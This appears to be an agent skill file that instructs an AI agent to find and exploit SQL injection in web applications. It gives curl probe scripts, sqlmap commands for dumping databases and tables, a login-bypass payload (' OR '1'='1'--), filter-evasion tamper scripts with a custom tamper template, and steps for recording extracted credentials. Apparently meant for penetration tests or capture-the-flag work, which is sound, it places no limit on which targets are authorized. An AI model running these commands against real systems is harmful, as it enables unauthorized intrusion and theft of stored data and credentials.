---
name: web-sql-injection
description: Detect and exploit SQL injection vulnerabilities in web applications. Load when user-controlled input is incorporated into database queries, or when authentication bypass, data extraction, or error-based information disclosure is the objective.
metadata: 
  requirements:
  - sqlmap
  - curl
---

# Confirm Injection Point

When you have identified a potential injection point, start by manually testing it to decide whether to proceed.

To perform manual testing, write a probe script and execute it; if you have a file write tool use it to write the file.

> Note: avoid loading full HTML responses in context, filter before output reaches you.

Here's an example of how you would write a probe script to test whether a query parameter `id` is an injection point:
```bash
cat > sqli_probe.sh << 'EOF'
TARGET="http://TARGET_URL"
PARAM="id"

# Error probe
ERROR=$(curl -s "${TARGET}?${PARAM}=1'" | grep -iEc "(error|sql|syntax|warning|exception|pg_query|mysql_fetch)")

# Boolean probe — compare response sizes
TRUE_SZ=$(curl -s -o /dev/null -w "%{size_download}" "${TARGET}?${PARAM}=1 AND 1=1")
FALSE_SZ=$(curl -s -o /dev/null -w "%{size_download}" "${TARGET}?${PARAM}=1 AND 1=2")

echo "error_lines=$ERROR true_size=$TRUE_SZ false_size=$FALSE_SZ"
EOF

bash /tmp/sqli_probe.sh
```

What to look for:
 
| Response | Meaning |
|---|---|
| SQL error message in output | Error-based injection confirmed |
| Different size between AND 1=1 and AND 1=2 | Blind boolean confirmed |
| Delayed response on `AND SLEEP(5)` | Time-based blind confirmed |
| Identical responses to all probes | Likely not injectable here |
 
If no response difference is observed across GET params, POST body, cookies, and headers, move on. 
Do not retry the same parameter.

If you haven't identified the database backend yet, attempt doing it now:
```bash
curl -s "http://$TARGET/item?id=1'" | grep -iE "(mysql|postgresql|sqlite|oracle|mssql|syntax)" | head -5
``` 

If you have access to a **whiteboard**, record the confirmed injection point before proceeding:
```
name: sqli_[name...]
description: Injection confirmed on <endpoint>, parameter <param>, type <error|boolean|time>.
content: probe commands and responses that confirmed the injection
```

# sqlmap

When executing `sqlmap` always add `-v 0 --batch` parameters, this suppresses per-request logging and avoids confirmation prompts; those parameters are required to avoid bloating the context and to ensure proper execution of commands.

### Invocation by injection point type

```bash
# GET parameter
sqlmap -u "http://$TARGET/item?id=1" -p id --batch -v 0 --random-agent
 
# POST body
sqlmap -u "http://$TARGET/login" --data "username=test&password=test" -p username --batch -v 0 --random-agent
 
# JSON body
sqlmap -u "http://$TARGET/api/item" \
  --data '{"id": "1"}' \
  --headers="Content-Type: application/json" \
  --batch -v 0 --random-agent
 
# Cookie
sqlmap -u "http://$TARGET/" --cookie "session=abc123*" --batch -v 0 --random-agent
 
# HTTP header
sqlmap -u "http://$TARGET/" --headers="X-Forwarded-For: 127.0.0.1*" --batch -v 0 --random-agent
```

### Useful Flags

| Flag | Use |
|---|---|
| `--dbms=mysql` | Skip DBMS detection when already known |
| `--technique=BEUST` | Restrict to specific techniques (B=boolean, E=error, U=union, S=stacked, T=time) |
| `--level=5 --risk=3` | Maximum coverage — use when lower levels find nothing |
| `--threads=5` | Parallel requests — speeds up blind injection |
| `--string="welcome"` | Boolean anchor — string present in true-condition response only |
| `--second-url="http://$TARGET/profile"` | Second-order: inject at main URL, trigger at second-url |
| `--auth-type=Basic --auth-cred="user:pass"` | Authenticated endpoints |

### Data extraction sequence
 
```bash
# 1. Current context
sqlmap -u "http://$TARGET/item?id=1" --batch -v 0 --current-db --current-user
 
# 2. List databases
sqlmap -u "http://$TARGET/item?id=1" --batch -v 0 --dbs
 
# 3. List tables in target database
sqlmap -u "http://$TARGET/item?id=1" --batch -v 0 -D <database> --tables
 
# 4. Dump target table
sqlmap -u "http://$TARGET/item?id=1" --batch -v 0 -D <database> -T <table> --dump
```
 
After each step, read extracted values before deciding what to dump next.

If you have access to a **whiteboard**, record extracted credentials or flag values immediately:
```
name: sqli_[name...]
description: SQLi on <endpoint> parameter <param>, type <error|boolean|time>, extracted <table> from <database>: <key finding>.
content: 
1. probe commands and responses that confirmed the injection
2. sqlmap command used, extracted values
```

### Authentication bypass

```bash
curl -s -X POST "http://$TARGET/login" \
  --data "username=' OR '1'='1'--&password=x" \
  -o /dev/null -w "status=%{http_code} size=%{size_download}\n"
```
 
A redirect (302) or significantly larger response indicates bypass. If manual fails:
 
```bash
sqlmap -u "http://$TARGET/login" \
  --data "username=*&password=test" \
  --string="Welcome" \
  --technique=B \
  --batch -v 0
```

## Filter Bypass 

Try `--level=5 --risk=3` first. If still blocked, apply tamper scripts.

### Built-in tampers
 
| Tamper | What it does | Bypasses |
|---|---|---|
| `space2comment` | Replaces spaces with `/**/` | Space / whitespace filters |
| `space2dash` | Replaces spaces with `--x\n` | Strict space filters |
| `randomcase` | Randomizes keyword casing (`SeLeCt`) | Case-sensitive keyword blocklists |
| `between` | Replaces `=` and `>` with BETWEEN equivalents | Comparison operator filters |
| `charencode` | URL-encodes every character in payload | Raw character sanitization |
| `htmlencode` | HTML-encodes characters (`'` → `&#39;`) | HTML-context injection points |
 
Combine with comma separation: `--tamper=space2comment,randomcase`
 
### Writing a custom tamper
 
If built-in tampers do not bypass the filter and you have identified the specific encoding or transformation the application expects, write a custom tamper.

Tamper structure:
 
```python
from lib.core.enums import PRIORITY
 
__priority__ = PRIORITY.NORMAL
 
def dependencies():
    # Runs once before tamper execution
    pass
 
def tamper(payload, **kwargs):
    """One-line description of what this tamper does."""
    # Useful kwargs:
    #   kwargs.get("dbms")      — detected DBMS, adapt syntax per backend
    #   kwargs.get("paramType") — URI / POST / COOKIE / HEADER
    #   kwargs.get("headers")   — current request headers dict
    if payload:
        return payload.replace(" ", "/**/")
    return payload
```

Reference by filename without extension: `--tamper=/path/to/mytamper`
 
When combining multiple tampers, priority controls processing order: `LOWEST < LOWER < LOW < NORMAL < HIGH < HIGHER < HIGHEST`.

## Stop Condition

If sqlmap with `--level=5 --risk=3` across all identified parameters returns nothing, the endpoint is not vulnerable via standard techniques. Do not retry.
 
If you have a **whiteboard tool**, record the dead end:
 
```
name: sqli_[name...]
description: SQLi not found on <endpoint> (...)
content: parameters tested, sqlmap command used
```
 
